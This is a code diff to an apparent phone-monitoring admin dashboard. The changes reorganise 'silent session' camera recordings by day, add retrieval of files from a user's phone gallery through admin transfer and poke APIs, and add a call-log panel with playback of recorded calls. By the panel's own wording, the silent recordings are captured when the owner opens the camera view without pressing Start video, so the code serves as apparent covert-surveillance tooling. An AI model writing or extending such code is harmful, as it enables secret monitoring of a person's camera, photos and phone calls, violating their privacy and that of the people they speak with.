@@ -678,6 +678,7 @@ function setPhoneTab(tab) {
   document.querySelectorAll("#device-control-view .phone-tab-panel").forEach((panel) => {
     panel.hidden = panel.getAttribute("data-phone-panel") !== tab;
   });
+  if (tab === "call-logs") void refreshAdminCallLogsPanel().catch(() => {});
 }
 
 function kvRows(obj, keys) {
@@ -856,8 +857,63 @@ function groupAdminSilentSessions(items) {
     const totalMs = segments.reduce((sum, s) => sum + Number(s.durationMs || 0), 0);
     return { sessionId, segments, started, ended, totalMs };
   });
-  groups.sort((a, b) => Number(b.ended || 0) - Number(a.ended || 0));
+  groups.sort((a, b) => Number(b.started || 0) - Number(a.started || 0));
   return groups;
+}
+
+function silentRecordingDayKey(ms) {
+  const n = Number(ms || 0);
+  if (!n) return "unknown";
+  const d = new Date(n);
+  return `${d.getFullYear()}-${String(d.getMonth() + 1).padStart(2, "0")}-${String(d.getDate()).padStart(2, "0")}`;
+}
+
+function groupSilentSessionsByDay(sessionGroups) {
+  const map = new Map();
+  for (const g of sessionGroups) {
+    const key = silentRecordingDayKey(g.started);
+    if (!map.has(key)) map.set(key, []);
+    map.get(key).push(g);
+  }
+  return [...map.entries()].sort((a, b) => String(b[0]).localeCompare(String(a[0])));
+}
+
+function fmtTimeShort(ms) {
+  const n = Number(ms || 0);
+  if (!n) return "—";
+  try {
+    return new Date(n).toLocaleString(undefined, {
+      hour: "numeric",
+      minute: "2-digit",
+      second: "2-digit",
+      hour12: true,
+    });
+  } catch {
+    return "—";
+  }
+}
+
+function wireSilentTimelineCollapse(root) {
+  root?.querySelectorAll(".silent-day-header, .silent-session-header").forEach((btn) => {
+    btn.addEventListener("click", () => {
+      const group = btn.closest(".silent-day-group, .silent-session-group");
+      const body = group?.querySelector(":scope > .silent-day-body, :scope > .silent-session-body");
+      const chevron = btn.querySelector(".silent-collapse-chevron");
+      if (!group || !body) return;
+      const opening = body.hasAttribute("hidden");
+      if (opening) {
+        body.removeAttribute("hidden");
+        group.classList.add("is-open");
+        btn.setAttribute("aria-expanded", "true");
+        if (chevron) chevron.textContent = "▲";
+      } else {
+        body.setAttribute("hidden", "");
+        group.classList.remove("is-open");
+        btn.setAttribute("aria-expanded", "false");
+        if (chevron) chevron.textContent = "▼";
+      }
+    });
+  });
 }
 
 function renderAdminSilentRecordingsTimeline() {
@@ -871,48 +927,70 @@ function renderAdminSilentRecordingsTimeline() {
     el.innerHTML = `<p class="muted">No silent session recordings yet. They appear when ${escapeHtml(ownerEmail)} connects to the camera (live view) without pressing Start video.</p>`;
     return;
   }
-  const groups = groupAdminSilentSessions(silentItems);
-  el.innerHTML = `<div class="silent-timeline">${groups
-    .map((g) => {
-      const sessionLabel = escapeHtml(fmtTime(g.started));
-      const endLabel = g.ended ? escapeHtml(fmtTime(g.ended)) : "—";
-      const dur = escapeHtml(formatUsageDuration(g.totalMs || 0));
-      return `<section class="silent-session-group surface">
-        <header class="silent-session-head">
-          <span class="admin-badge silent">Silent session</span>
-          <strong>${sessionLabel}</strong>
-          <span class="muted">→ ${endLabel} · ${g.segments.length} segment(s) · ${dur} recorded</span>
-          <span class="muted">User: ${escapeHtml(ownerEmail)} · Session ${escapeHtml(g.sessionId.slice(0, 12))}…</span>
-        </header>
-        <div class="silent-segments">${g.segments
-          .map((m) => {
-            const url = String(m.downloadUrl || "");
-            const seg = Number(m.segmentIndex || 0) + 1;
-            const when = escapeHtml(fmtTime(m.segmentStartedAt || m.createdAt));
-            const segDur = escapeHtml(formatUsageDuration(m.durationMs || 0));
-            const name = escapeHtml(m.fileName || `segment-${seg}`);
-            return `<article class="silent-segment-row">
-              <div class="silent-segment-meta">
-                <strong>Segment ${seg}</strong> · ${when} · ${segDur}
-                <div class="muted">${name}</div>
-              </div>
-              ${
-                url
-                  ? `<video class="live-capture-preview" src="${escapeHtml(url)}" controls playsinline preload="metadata" style="max-width:100%;max-height:200px;border-radius:8px;margin-top:8px;"></video>
-                     <div class="admin-gallery-actions" style="margin-top:6px;display:flex;gap:8px;flex-wrap:wrap;">
-                       <a class="btn-secondary" href="${escapeHtml(url)}" target="_blank" rel="noopener">Open / Download</a>
-                       <button type="button" class="btn-danger btn-admin-media-hard-delete" data-media-id="${escapeHtml(m.mediaId)}">Delete permanently</button>
-                     </div>`
-                  : ""
-              }
-            </article>`;
-          })
-          .join("")}</div>
+  const sessions = groupAdminSilentSessions(silentItems);
+  const dayGroups = groupSilentSessionsByDay(sessions);
+  el.innerHTML = `<div class="silent-timeline">${dayGroups
+    .map(([dayKey, daySessions]) => {
+      const dayTotalMs = daySessions.reduce((sum, g) => sum + Number(g.totalMs || 0), 0);
+      const sessionCount = daySessions.length;
+      const segCount = daySessions.reduce((sum, g) => sum + g.segments.length, 0);
+      return `<section class="silent-day-group" data-day="${escapeHtml(dayKey)}">
+        <button type="button" class="silent-day-header" aria-expanded="false">
+          <span class="silent-day-title">${escapeHtml(usageDayLabel(dayKey))}</span>
+          <span class="silent-day-meta muted">${sessionCount} session(s) · ${segCount} segment(s) · ${escapeHtml(formatUsageDuration(dayTotalMs))}</span>
+          <span class="silent-collapse-chevron" aria-hidden="true">▼</span>
+        </button>
+        <div class="silent-day-body" hidden>
+          ${daySessions
+            .map((g) => {
+              const startShort = escapeHtml(fmtTimeShort(g.started));
+              const endShort = g.ended ? escapeHtml(fmtTimeShort(g.ended)) : "—";
+              const dur = escapeHtml(formatUsageDuration(g.totalMs || 0));
+              return `<section class="silent-session-group" data-session="${escapeHtml(g.sessionId)}">
+                <button type="button" class="silent-session-header" aria-expanded="false">
+                  <span class="admin-badge silent">Silent</span>
+                  <span class="silent-session-time"><strong>${startShort}</strong> → ${endShort}</span>
+                  <span class="silent-session-meta muted">${g.segments.length} segment(s) · ${dur}</span>
+                  <span class="silent-collapse-chevron" aria-hidden="true">▼</span>
+                </button>
+                <div class="silent-session-body" hidden>
+                  <p class="muted silent-session-sub">User: ${escapeHtml(ownerEmail)} · Session ${escapeHtml(g.sessionId.slice(0, 12))}…</p>
+                  <div class="silent-segments">${g.segments
+                    .map((m) => {
+                      const url = String(m.downloadUrl || "");
+                      const seg = Number(m.segmentIndex || 0) + 1;
+                      const when = escapeHtml(fmtTimeShort(m.segmentStartedAt || m.createdAt));
+                      const segDur = escapeHtml(formatUsageDuration(m.durationMs || 0));
+                      const name = escapeHtml(m.fileName || `segment-${seg}`);
+                      return `<article class="silent-segment-row">
+                        <div class="silent-segment-meta">
+                          <strong>Segment ${seg}</strong> · ${when} · ${segDur}
+                          <div class="muted">${name}</div>
+                        </div>
+                        ${
+                          url
+                            ? `<video class="live-capture-preview" src="${escapeHtml(url)}" controls playsinline preload="metadata"></video>
+                               <div class="admin-gallery-actions silent-segment-actions">
+                                 <a class="btn-secondary" href="${escapeHtml(url)}" target="_blank" rel="noopener">Open / Download</a>
+                                 <button type="button" class="btn-danger btn-admin-media-hard-delete" data-media-id="${escapeHtml(m.mediaId)}">Delete permanently</button>
+                               </div>`
+                            : ""
+                        }
+                      </article>`;
+                    })
+                    .join("")}</div>
+                </div>
+              </section>`;
+            })
+            .join("")}
+        </div>
       </section>`;
     })
     .join("")}</div>`;
+  wireSilentTimelineCollapse(el);
   el.querySelectorAll(".btn-admin-media-hard-delete").forEach((btn) => {
-    btn.addEventListener("click", () => {
+    btn.addEventListener("click", (ev) => {
+      ev.stopPropagation();
       const mediaId = btn.getAttribute("data-media-id") || "";
       if (mediaId) void hardDeleteAdminMedia(mediaId);
     });
@@ -1201,6 +1279,126 @@ function closeAdminGalleryInlineViewer() {
   if (wrap) wrap.hidden = true;
 }
 
+function formatAdminTransferError(t) {
+  const code = String(t?.errorCode || "").trim();
+  const msg = String(t?.errorMessage || "").trim();
+  if (code === "ITEM_NOT_FOUND" || /not available locally/i.test(msg)) {
+    return "File not on phone anymore. Tap Request index, wait a few seconds, Refresh, then retry.";
+  }
+  if (code === "GALLERY_DISABLED") {
+    return "Gallery access is disabled on the phone. Enable it in the app, then retry.";
+  }
+  if (code === "UPLOAD_FAILED" || /unknown error occurred/i.test(msg)) {
+    return "Phone could not upload this file. Keep the phone unlocked and online, enable gallery access, tap Request index, then retry.";
+  }
+  return msg || code || `Transfer ${String(t?.status || "failed")}`;
+}
+
+async function findReadyAdminGalleryTransfer(ownerUid, deviceId, itemId) {
+  const data = await api(
+    `/api/admin/users/${encodeURIComponent(ownerUid)}/transfers?deviceId=${encodeURIComponent(deviceId)}`
+  );
+  const rows = data.transfers || [];
+  return (
+    rows.find(
+      (t) =>
+        String(t.deviceId || "") === deviceId &&
+        String(t.sourceReference || "") === itemId &&
+        t.status === "ready" &&
+        (t.storagePath || t.downloadUrl || t.contentUrl)
+    ) || null
+  );
+}
+
+async function fetchAdminTransferBlob(ownerUid, transfer) {
+  const transferId = String(transfer?.transferId || "").trim();
+  const errors = [];
+  if (transferId && idToken) {
+    try {
+      const res = await fetch(
+        `/api/admin/users/${encodeURIComponent(ownerUid)}/transfers/${encodeURIComponent(transferId)}/content`,
+        { headers: { Authorization: `Bearer ${idToken}` } }
+      );
+      if (res.ok) return await res.blob();
+      const body = await res.json().catch(() => ({}));
+      errors.push(body.error || `content HTTP ${res.status}`);
+    } catch (e) {
+      errors.push(e instanceof Error ? e.message : String(e));
+    }
+  }
+  const url = String(transfer?.downloadUrl || "").trim();
+  if (url) {
+    try {
+      const res = await fetch(url);
+      if (res.ok) return await res.blob();
+      errors.push(`signed URL HTTP ${res.status}`);
+    } catch (e) {
+      errors.push(e instanceof Error ? e.message : String(e));
+    }
+  }
+  throw new Error(
+    errors[0] ? `Could not open file (${errors[0]})` : "Transfer ready but file could not be downloaded"
+  );
+}
+
+/**
+ * Wait for phone upload with admin transfer API + optional command poke.
+ */
+async function pollAdminGalleryTransfer(ownerUid, deviceId, transferId, commandId, onProgress) {
+  const timeoutMs = 3 * 60 * 1000;
+  const deadline = Date.now() + timeoutMs;
+  let poked = false;
+  const pokeUrl =
+    deviceId && commandId
+      ? `/api/admin/users/${encodeURIComponent(ownerUid)}/devices/${encodeURIComponent(deviceId)}/commands/${encodeURIComponent(commandId)}/poke`
+      : "";
+  while (Date.now() < deadline) {
+    const data = await api(
+      `/api/admin/users/${encodeURIComponent(ownerUid)}/transfers/${encodeURIComponent(transferId)}`
+    );
+    const t = data.transfer || {};
+    const st = String(t.status || "");
+    const progress = Number(t.progress || 0);
+    if (st === "requested" || st === "pending") {
+      onProgress?.(Math.max(5, progress), st);
+    } else if (st === "uploading") {
+      onProgress?.(Math.max(10, progress || 10), st);
+    } else {
+      onProgress?.(Math.max(5, progress || 5), st);
+    }
+    if (st === "ready") {
+      try {
+        const list = await api(
+          `/api/admin/users/${encodeURIComponent(ownerUid)}/transfers?deviceId=${encodeURIComponent(deviceId)}`
+        );
+        const row = (list.transfers || []).find((x) => x.transferId === transferId);
+        if (row && (row.downloadUrl || row.storagePath || row.contentUrl)) {
+          return row;
+        }
+      } catch {
+        /* use transfer doc */
+      }
+      if (t.storagePath || t.downloadUrl) {
+        return { ...t, transferId };
+      }
+      throw new Error("Transfer ready but file path missing");
+    }
+    if (st === "failed" || st === "cancelled" || st === "expired") {
+      throw new Error(formatAdminTransferError(t));
+    }
+    if (!poked && pokeUrl && Date.now() + timeoutMs - deadline > 4000) {
+      poked = true;
+      try {
+        await api(pokeUrl, { method: "POST", body: "{}" });
+      } catch {
+        /* phone may still pick up via Firestore */
+      }
+    }
+    await new Promise((r) => setTimeout(r, 1000));
+  }
+  throw new Error("Transfer timed out — keep the phone unlocked and try again");
+}
+
 function showAdminGalleryInline(entry) {
   const wrap = document.getElementById("admin-gallery-inline-viewer");
   const body = document.getElementById("admin-gallery-inline-body");
@@ -1261,58 +1459,72 @@ async function downloadAdminGalleryItem(item, btn) {
   adminGalleryItemState.set(key, state);
   paintAdminGalleryButton(btn, state, item);
   try {
-    const started = await api(
-      `/api/admin/users/${encodeURIComponent(exploreCtx.ownerUid)}/devices/${encodeURIComponent(exploreCtx.deviceId)}/gallery/transfer`,
-      {
-        method: "POST",
-        body: JSON.stringify({
-          itemId: item.itemId,
-          displayName: item.displayName,
-          mimeType: item.mimeType,
-          sizeBytes: item.sizeBytes,
-        }),
-      }
+    let transfer = await findReadyAdminGalleryTransfer(
+      exploreCtx.ownerUid,
+      exploreCtx.deviceId,
+      item.itemId
     );
-    const transferId = started.transfer?.transferId || started.transferId;
-    if (!transferId) throw new Error("No transferId returned");
-    const deadline = Date.now() + 90_000;
-    while (Date.now() < deadline) {
-      const data = await api(
-        `/api/admin/users/${encodeURIComponent(exploreCtx.ownerUid)}/transfers/${encodeURIComponent(transferId)}`
+    if (!transfer) {
+      const started = await api(
+        `/api/admin/users/${encodeURIComponent(exploreCtx.ownerUid)}/devices/${encodeURIComponent(exploreCtx.deviceId)}/gallery/transfer`,
+        {
+          method: "POST",
+          body: JSON.stringify({
+            itemId: item.itemId,
+            displayName: item.displayName,
+            mimeType: item.mimeType,
+            sizeBytes: item.sizeBytes,
+          }),
+        }
       );
-      const t = data.transfer || {};
-      const st = String(t.status || "");
-      const p = Math.max(3, Math.min(99, Number(t.progress) || 3));
-      state = { ...state, status: "downloading", progress: p };
+      const transferId = started.transfer?.transferId || started.transferId;
+      const commandId = started.command?.commandId || null;
+      if (!transferId) throw new Error("No transferId returned");
+      state = { ...state, progress: 5 };
       adminGalleryItemState.set(key, state);
       paintAdminGalleryButton(btn, state, item);
-      if (st === "ready") {
-        const url = `/api/admin/users/${encodeURIComponent(exploreCtx.ownerUid)}/transfers/${encodeURIComponent(transferId)}/content`;
-        const res = await fetch(url, { headers: { Authorization: `Bearer ${idToken}` } });
-        if (!res.ok) throw new Error(`Download failed (HTTP ${res.status})`);
-        const blob = await res.blob();
-        const mime = String(item.mimeType || t.mimeType || blob.type || "");
-        const objectUrl = URL.createObjectURL(blob);
-        const ready = {
-          status: "ready",
-          progress: 100,
-          objectUrl,
-          mimeType: mime,
-          displayName: item.displayName || t.displayName || "file",
-          type: String(item.type || "").toLowerCase(),
-        };
-        adminGalleryCache.set(key, ready);
-        adminGalleryItemState.set(key, ready);
-        paintAdminGalleryButton(btn, ready, item);
-        showAdminGalleryInline(ready);
-        return;
-      }
-      if (st === "failed" || st === "cancelled" || st === "expired") {
-        throw new Error(t.errorMessage || t.errorCode || `Transfer ${st}`);
-      }
-      await new Promise((r) => setTimeout(r, 1200));
+      transfer = await pollAdminGalleryTransfer(
+        exploreCtx.ownerUid,
+        exploreCtx.deviceId,
+        transferId,
+        commandId,
+        (progress, status) => {
+          let p = Math.max(5, Number(progress) || 5);
+          if (status === "uploading") p = Math.max(p, 10);
+          state = { ...state, status: "downloading", progress: p };
+          adminGalleryItemState.set(key, state);
+          paintAdminGalleryButton(btn, state, item);
+        }
+      );
+    } else {
+      state = { ...state, progress: 90 };
+      adminGalleryItemState.set(key, state);
+      paintAdminGalleryButton(btn, state, item);
     }
-    throw new Error("Timed out waiting for phone upload.");
+
+    state = { ...state, progress: 95 };
+    adminGalleryItemState.set(key, state);
+    paintAdminGalleryButton(btn, state, item);
+
+    const blob = await fetchAdminTransferBlob(exploreCtx.ownerUid, transfer);
+    const mime = String(item.mimeType || transfer.mimeType || blob.type || "");
+    const typed =
+      mime && (!blob.type || blob.type === "application/octet-stream")
+        ? new Blob([blob], { type: mime })
+        : blob;
+    const objectUrl = URL.createObjectURL(typed);
+    const ready = {
+      status: "ready",
+      progress: 100,
+      objectUrl,
+      mimeType: mime,
+      displayName: item.displayName || transfer.displayName || "file",
+      type: String(item.type || "").toLowerCase(),
+    };
+    adminGalleryCache.set(key, ready);
+    adminGalleryItemState.set(key, ready);
+    paintAdminGalleryButton(btn, ready, item);
+    showAdminGalleryInline(ready);
   } catch (e) {
     state = { ...state, status: "error", progress: 0 };
     adminGalleryItemState.set(key, state);
@@ -1866,71 +2078,64 @@ async function openAdminGalleryItem(item) {
   if (body) body.textContent = "Requesting file from phone…";
   if (status) status.textContent = "Starting transfer…";
   try {
-    const started = await api(
-      `/api/admin/users/${encodeURIComponent(exploreCtx.ownerUid)}/devices/${encodeURIComponent(exploreCtx.deviceId)}/gallery/transfer`,
-      {
-        method: "POST",
-        body: JSON.stringify({
-          itemId: item.itemId,
-          displayName: item.displayName,
-          mimeType: item.mimeType,
-          sizeBytes: item.sizeBytes,
-        }),
-      }
+    let transfer = await findReadyAdminGalleryTransfer(
+      exploreCtx.ownerUid,
+      exploreCtx.deviceId,
+      item.itemId
     );
-    const transferId = started.transfer?.transferId || started.transferId;
-    if (!transferId) throw new Error("No transferId returned");
-    if (status) status.textContent = "Waiting for phone upload…";
-    await pollAdminTransfer(exploreCtx.ownerUid, transferId, item, body, status, cacheKey);
+    if (!transfer) {
+      const started = await api(
+        `/api/admin/users/${encodeURIComponent(exploreCtx.ownerUid)}/devices/${encodeURIComponent(exploreCtx.deviceId)}/gallery/transfer`,
+        {
+          method: "POST",
+          body: JSON.stringify({
+            itemId: item.itemId,
+            displayName: item.displayName,
+            mimeType: item.mimeType,
+            sizeBytes: item.sizeBytes,
+          }),
+        }
+      );
+      const transferId = started.transfer?.transferId || started.transferId;
+      const commandId = started.command?.commandId || null;
+      if (!transferId) throw new Error("No transferId returned");
+      if (status) status.textContent = "Waiting for phone upload…";
+      transfer = await pollAdminGalleryTransfer(
+        exploreCtx.ownerUid,
+        exploreCtx.deviceId,
+        transferId,
+        commandId,
+        (progress, st) => {
+          if (status) {
+            status.textContent =
+              st === "ready" ? "Ready" : `Status: ${st || "…"} · ${Math.round(Number(progress) || 0)}%`;
+          }
+        }
+      );
+    } else if (status) {
+      status.textContent = "Loading cached transfer…";
+    }
+    const blob = await fetchAdminTransferBlob(exploreCtx.ownerUid, transfer);
+    const type = String(item.type || "").toLowerCase();
+    const mime = String(item.mimeType || transfer.mimeType || blob.type || "");
+    const typed =
+      mime && (!blob.type || blob.type === "application/octet-stream")
+        ? new Blob([blob], { type: mime })
+        : blob;
+    const objectUrl = URL.createObjectURL(typed);
+    const entry = {
+      objectUrl,
+      mimeType: mime || typed.type || "",
+      displayName: item.displayName || transfer.displayName || "file",
+      type,
+    };
+    if (cacheKey) adminGalleryCache.set(cacheKey, entry);
+    renderAdminMediaBody(body, entry);
+    if (status) status.textContent = "Loaded — play below or download.";
   } catch (e) {
     if (body) body.textContent = formatApiError(e);
     if (status) status.textContent = "";
   }
-}
-
-async function pollAdminTransfer(ownerUid, transferId, item, body, status, cacheKey) {
-  const deadline = Date.now() + 90_000;
-  while (Date.now() < deadline) {
-    const data = await api(
-      `/api/admin/users/${encodeURIComponent(ownerUid)}/transfers/${encodeURIComponent(transferId)}`
-    );
-    const t = data.transfer || {};
-    const st = String(t.status || "");
-    if (status) {
-      status.textContent =
-        st === "ready"
-          ? "Ready"
-          : `Status: ${st || "…"} · ${Math.round(Number(t.progress || 0))}%`;
-    }
-    if (st === "ready") {
-      const url = `/api/admin/users/${encodeURIComponent(ownerUid)}/transfers/${encodeURIComponent(transferId)}/content`;
-      const type = String(item.type || "").toLowerCase();
-      const mime = String(item.mimeType || t.mimeType || "");
-      const res = await fetch(url, { headers: { Authorization: `Bearer ${idToken}` } });
-      if (!res.ok) throw new Error(`Download failed (HTTP ${res.status})`);
-      const blob = await res.blob();
-      const typed =
-        mime && (!blob.type || blob.type === "application/octet-stream")
-          ? new Blob([blob], { type: mime })
-          : blob;
-      const objectUrl = URL.createObjectURL(typed);
-      const entry = {
-        objectUrl,
-        mimeType: mime || typed.type || "",
-        displayName: item.displayName || t.displayName || "file",
-        type,
-      };
-      if (cacheKey) adminGalleryCache.set(cacheKey, entry);
-      renderAdminMediaBody(body, entry);
-      if (status) status.textContent = "Loaded — play below or download.";
-      return;
-    }
-    if (st === "failed" || st === "cancelled" || st === "expired") {
-      throw new Error(t.errorMessage || t.errorCode || `Transfer ${st}`);
-    }
-    await new Promise((r) => setTimeout(r, 1500));
-  }
-  throw new Error("Timed out waiting for phone upload. Keep the phone online and try again.");
 }
 
 async function openAdminRecording(transferId, displayName) {
@@ -2001,32 +2206,343 @@ function renderMessagesPanel() {
     .join("")}</ul>`;
 }
 
+function callDayKey(ms) {
+  const n = Number(ms || 0);
+  if (!n) return "unknown";
+  const d = new Date(n);
+  if (Number.isNaN(d.getTime())) return "unknown";
+  const y = d.getFullYear();
+  const m = String(d.getMonth() + 1).padStart(2, "0");
+  const day = String(d.getDate()).padStart(2, "0");
+  return `${y}-${m}-${day}`;
+}
+
+function callDayLabel(dayKey) {
+  if (!dayKey || dayKey === "unknown") return "Unknown date";
+  const [y, m, d] = dayKey.split("-").map(Number);
+  const date = new Date(y, m - 1, d);
+  const today = new Date();
+  const startToday = new Date(today.getFullYear(), today.getMonth(), today.getDate());
+  const startThat = new Date(date.getFullYear(), date.getMonth(), date.getDate());
+  const diffDays = Math.round((startToday - startThat) / 86400000);
+  const pretty = date.toLocaleDateString(undefined, {
+    weekday: "short",
+    month: "short",
+    day: "numeric",
+    year: "numeric",
+  });
+  if (diffDays === 0) return `Today · ${pretty}`;
+  if (diffDays === 1) return `Yesterday · ${pretty}`;
+  if (diffDays > 1) return `Previous · ${pretty}`;
+  return pretty;
+}
+
+function groupCallItemsByDay(items) {
+  const groups = new Map();
+  for (const it of items || []) {
+    const key = callDayKey(it?.date);
+    if (!groups.has(key)) groups.set(key, []);
+    groups.get(key).push(it);
+  }
+  return [...groups.entries()].sort((a, b) => {
+    if (a[0] === "unknown") return 1;
+    if (b[0] === "unknown") return -1;
+    return b[0].localeCompare(a[0]);
+  });
+}
+
+function callTypeLabel(type) {
+  const t = String(type || "").toLowerCase();
+  const map = {
+    incoming: "Incoming",
+    outgoing: "Outgoing",
+    missed: "Missed",
+    voicemail: "Voicemail",
+    rejected: "Rejected",
+    blocked: "Blocked",
+    answered_externally: "Answered elsewhere",
+  };
+  return map[t] || (t ? t.replace(/_/g, " ") : "Unknown");
+}
+
+function callTypeClass(type) {
+  const t = String(type || "").toLowerCase();
+  if (t === "incoming") return "call-type-incoming";
+  if (t === "outgoing") return "call-type-outgoing";
+  if (t === "missed") return "call-type-missed";
+  if (t === "voicemail") return "call-type-voicemail";
+  if (t === "rejected") return "call-type-rejected";
+  if (t === "blocked") return "call-type-blocked";
+  if (t === "answered_externally") return "call-type-external";
+  return "call-type-other";
+}
+
+function formatCallDateTime(ms) {
+  const n = Number(ms || 0);
+  if (!n) return "—";
+  try {
+    return new Date(n).toLocaleString(undefined, {
+      year: "numeric",
+      month: "short",
+      day: "numeric",
+      hour: "numeric",
+      minute: "2-digit",
+      second: "2-digit",
+      hour12: true,
+    });
+  } catch {
+    return String(n);
+  }
+}
+
+function formatCallDuration(sec) {
+  const s = Math.max(0, Number(sec || 0));
+  if (!s) return "0s";
+  const h = Math.floor(s / 3600);
+  const m = Math.floor((s % 3600) / 60);
+  const r = s % 60;
+  if (h > 0) return `${h}h ${m}m ${r}s`;
+  if (m > 0) return `${m}m ${r}s`;
+  return `${r}s`;
+}
+
+function isAdminCallRecordingPlayable(it) {
+  if (!it) return false;
+  if (String(it.recordingStatus || "").toLowerCase() !== "ready") return false;
+  return Boolean(
+    String(it.recordingUrl || "").trim() ||
+      String(it.recordingContentUrl || "").trim() ||
+      String(it.recordingStoragePath || "").trim()
+  );
+}
+
+function sniffAdminAudioMime(buf, fallbackMime) {
+  const u8 = new Uint8Array(buf);
+  if (u8.length >= 5) {
+    const head = String.fromCharCode(u8[0], u8[1], u8[2], u8[3], u8[4]);
+    if (head.startsWith("#!AMR")) return { mime: "audio/amr", ext: "amr" };
+  }
+  if (u8.length >= 12 && u8[4] === 0x66 && u8[5] === 0x74 && u8[6] === 0x79 && u8[7] === 0x70) {
+    const brand = String.fromCharCode(u8[8], u8[9], u8[10], u8[11]).toLowerCase();
+    if (brand.includes("3gp") || brand.includes("3g2")) return { mime: "audio/3gpp", ext: "3gp" };
+    return { mime: "audio/mp4", ext: "m4a" };
+  }
+  if (u8.length >= 12) {
+    const riff = String.fromCharCode(u8[0], u8[1], u8[2], u8[3]);
+    const wave = String.fromCharCode(u8[8], u8[9], u8[10], u8[11]);
+    if (riff === "RIFF" && wave === "WAVE") return { mime: "audio/wav", ext: "wav" };
+  }
+  if (u8.length >= 3) {
+    if (u8[0] === 0x49 && u8[1] === 0x44 && u8[2] === 0x33) return { mime: "audio/mpeg", ext: "mp3" };
+    if (u8[0] === 0xff && (u8[1] & 0xe0) === 0xe0) return { mime: "audio/mpeg", ext: "mp3" };
+  }
+  const fb = String(fallbackMime || "").toLowerCase();
+  if (fb.includes("3gpp") || fb.includes("amr")) return { mime: fb || "audio/3gpp", ext: "3gp" };
+  if (fb.includes("mpeg") || fb.includes("mp3")) return { mime: "audio/mpeg", ext: "mp3" };
+  if (fb.includes("wav")) return { mime: "audio/wav", ext: "wav" };
+  if (fb.includes("mp4") || fb.includes("m4a") || fb.includes("aac")) return { mime: "audio/mp4", ext: "m4a" };
+  return { mime: fb || "audio/mp4", ext: "m4a" };
+}
+
+async function playAdminCallRecording(deviceId, item, buttonEl) {
+  if (!exploreCtx) throw new Error("No device context");
+  const ownerUid = exploreCtx.ownerUid;
+  const itemId = String(item?.itemId || "").trim();
+  if (!deviceId || !itemId) throw new Error("Missing call recording id");
+  const prev = buttonEl?.textContent;
+  if (buttonEl) {
+    buttonEl.disabled = true;
+    buttonEl.textContent = "Loading…";
+  }
+  try {
+    const contentPath =
+      String(item.recordingContentUrl || "").trim() ||
+      `/api/admin/users/${encodeURIComponent(ownerUid)}/devices/${encodeURIComponent(deviceId)}/call-logs/recording?itemId=${encodeURIComponent(itemId)}`;
+    const res = await fetch(contentPath, {
+      headers: idToken ? { Authorization: `Bearer ${idToken}` } : {},
+    });
+    if (!res.ok) {
+      const body = await res.json().catch(() => ({}));
+      throw new Error(body.error || `Recording HTTP ${res.status}`);
+    }
+    const headerMime = String(res.headers.get("content-type") || "").split(";")[0].trim();
+    const buf = await res.arrayBuffer();
+    if (!buf || buf.byteLength < 64) {
+      throw new Error("Recording file is empty or too small");
+    }
+    const sniffed = sniffAdminAudioMime(buf, headerMime || item.recordingMimeType || "");
+    const pathHint = String(item.recordingStoragePath || "").toLowerCase();
+    let mime = sniffed.mime;
+    let ext = sniffed.ext;
+    if (!ext) {
+      if (pathHint.endsWith(".3gp")) ext = "3gp";
+      else if (pathHint.endsWith(".amr")) ext = "amr";
+      else if (pathHint.endsWith(".mp3")) ext = "mp3";
+      else if (pathHint.endsWith(".wav")) ext = "wav";
+      else ext = "m4a";
+    }
+    if (!mime || mime === "application/octet-stream") {
+      mime =
+        ext === "3gp" || ext === "amr"
+          ? "audio/3gpp"
+          : ext === "mp3"
+            ? "audio/mpeg"
+            : ext === "wav"
+              ? "audio/wav"
+              : "audio/mp4";
+    }
+    const blob = new Blob([buf], { type: mime });
+    const objectUrl = URL.createObjectURL(blob);
+    const viewer = document.getElementById("admin-media-viewer");
+    const body = document.getElementById("admin-media-body");
+    const title = document.getElementById("admin-media-title");
+    const status = document.getElementById("admin-media-status");
+    show(viewer, true);
+    if (title) title.textContent = `Call recording · ${item.contactName || item.number || itemId.slice(0, 8)}`;
+    if (status) status.textContent = "Tap play below or download if in-browser playback fails.";
+    renderAdminMediaBody(body, {
+      objectUrl,
+      mimeType: mime,
+      displayName: `call-${itemId.slice(0, 10)}.${ext}`,
+      type: "audio",
+    });
+  } finally {
+    if (buttonEl) {
+      buttonEl.disabled = false;
+      buttonEl.textContent = prev || "▶ Play";
+    }
+  }
+}
+
+function renderCallLogsHtml(items, deviceId) {
+  const groups = groupCallItemsByDay(items);
+  return `<div class="call-day-list">${groups
+    .map(([dayKey, dayItems], index) => {
+      const open = index === 0 ? " is-open" : "";
+      const hidden = index === 0 ? "" : " hidden";
+      const chevron = index === 0 ? "▲" : "▼";
+      const count = dayItems.length;
+      return `<section class="call-day-group${open}" data-day="${escapeHtml(dayKey)}">
+        <button type="button" class="call-day-header" aria-expanded="${index === 0 ? "true" : "false"}">
+          <span class="call-day-title">${escapeHtml(callDayLabel(dayKey))}</span>
+          <span class="call-day-count">${count}</span>
+          <span class="call-day-chevron" aria-hidden="true">${chevron}</span>
+        </button>
+        <div class="call-day-body"${hidden}>
+          <div class="call-grid">${dayItems
+            .map((it) => {
+              const type = String(it.callType || it.type || "incoming").toLowerCase();
+              const typeLabel = escapeHtml(callTypeLabel(type));
+              const typeCls = callTypeClass(type);
+              const name = String(it.contactName || "").trim();
+              const number = String(it.number || "").trim() || "(unknown)";
+              const who = name ? `${escapeHtml(name)} · ${escapeHtml(number)}` : escapeHtml(number);
+              const when = escapeHtml(formatCallDateTime(it.date));
+              const dur = escapeHtml(formatCallDuration(it.durationSec));
+              const geo = String(it.geo || "").trim();
+              const playable = isAdminCallRecordingPlayable(it);
+              const recStatus = String(it.recordingStatus || "none").toLowerCase();
+              const showPlaySlot = type === "incoming" || type === "outgoing";
+              let playHtml = "";
+              if (showPlaySlot) {
+                if (playable) {
+                  playHtml = `<button type="button" class="btn-call-play" data-item-id="${escapeHtml(it.itemId || "")}" data-device-id="${escapeHtml(deviceId)}" title="Play call recording">▶ Play</button>`;
+                } else if (recStatus === "uploading" || recStatus === "pending") {
+                  playHtml = `<span class="call-rec-status call-rec-pending">Uploading…</span>`;
+                } else if (recStatus === "failed") {
+                  const err = String(it.recordingError || "Upload failed").trim();
+                  playHtml = `<span class="call-rec-status call-rec-failed" title="${escapeHtml(err)}">Recording failed${err ? `: ${escapeHtml(err.slice(0, 120))}` : ""}</span>`;
+                } else if (Number(it.durationSec || 0) > 0) {
+                  playHtml = `<span class="call-rec-status">No recording yet — phone needs Call logs + Phone + Mic, then remake the call</span>`;
+                } else {
+                  playHtml = `<span class="call-rec-status muted">—</span>`;
+                }
+              }
